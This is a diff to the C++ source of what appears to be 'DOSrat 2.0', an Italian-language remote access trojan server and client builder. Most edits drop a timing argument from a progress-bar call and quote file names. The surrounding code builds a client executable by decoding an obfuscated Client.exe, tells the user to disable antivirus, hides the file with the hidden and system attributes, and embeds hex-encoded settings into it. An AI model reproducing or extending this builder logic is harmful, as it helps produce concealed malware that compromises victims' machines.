@@ -88,7 +88,7 @@ int main()
 
     if (!SettaggiS.GetSettings())
     {
-        cli.StopBar(250);
+        cli.StopBar();
 
         tc.SetColor(tc.Red);
         cout << "Errore nel caricamento delle impostazioni." << endl;
@@ -114,7 +114,7 @@ int main()
     Server.Port = SettaggiS.Porta;
     if (Server.StartServer() != 0)
     {
-        cli.StopBar(250);
+        cli.StopBar();
 
         tc.SetColor(tc.Red);
         cout << "Errore nell'avvio del server." << endl;
@@ -133,7 +133,7 @@ int main()
 
     cli.LoadingPercentage = 100;
     cli.LoadingText = "Completato";
-    cli.StopBar(1000);
+    cli.StopBar();
 
     while (CicloMenu)
     {
@@ -280,7 +280,7 @@ int main()
 
                             if (!du.CheckFile("Build\\Client.exe"))
                             {
-                                cli.StopBar(250);
+                                cli.StopBar();
                                 tc.SetColor(tc.Red);
                                 cout << "Errore: file \"Build\\Client.exe\" non trovato.\nProva a riscaricare DOSrat 2.0." << endl;
                                 tc.SetColor(tc.Default);
@@ -294,7 +294,7 @@ int main()
 
                             if (!en.CharUnShift(69, "Build\\Client.exe", SettaggiC.ExeName))
                             {
-                                cli.StopBar(250);
+                                cli.StopBar();
                                 tc.SetColor(tc.Red);
                                 cout << "Errore durante la lettura/scrittura del Client.\nDisattiva l'antivirus e riprova." << endl;
                                 tc.SetColor(tc.Default);
@@ -306,9 +306,9 @@ int main()
                             cli.LoadingText = "Impostazione attributi";
 
                             if (SettaggiC.HideExe)
-                                su.NoOutputCMD("attrib +h " + SettaggiC.ExeName);
+                                su.NoOutputCMD("attrib +h \"" + SettaggiC.ExeName + "\"");
                             if (SettaggiC.SystemFile)
-                                su.NoOutputCMD("attrib +s " + SettaggiC.ExeName);
+                                su.NoOutputCMD("attrib +s \"" + SettaggiC.ExeName + "\"");
 
                             cli.LoadingPercentage = 75;
                             cli.LoadingText = "Personalizzazione settaggi";
@@ -316,7 +316,7 @@ int main()
                             du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}"));
 
                             cli.LoadingPercentage = 100;
-                            cli.StopBar(250);
+                            cli.StopBar();
                             
                             tc.SetColor(tc.Lime);
                             cout << "Creazione client completata!" << endl;
